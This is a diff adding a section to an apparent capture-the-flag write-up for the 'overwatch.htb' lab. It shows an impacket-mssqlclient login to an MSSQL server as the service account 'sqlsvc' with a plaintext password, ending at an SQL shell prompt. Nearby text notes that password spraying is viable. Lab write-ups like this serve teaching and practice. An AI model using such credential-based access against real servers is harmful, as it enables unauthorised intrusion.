@@ -336,4 +336,19 @@ No passwords in account descriptions!
 
 There is no lockout policy so password spraying is not an issue
 
+# Access on mssql as `sqlsvc`
+
+```python
+impacket-mssqlclient overwatch.htb/sqlsvc:'TI0LKcfHzZw1Vv'@s200401 -p 6520 -windows-auth
+Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
+[!] Press help for extra shell commands
+SQL (OVERWATCH\sqlsvc  guest@master)> 
+```
 
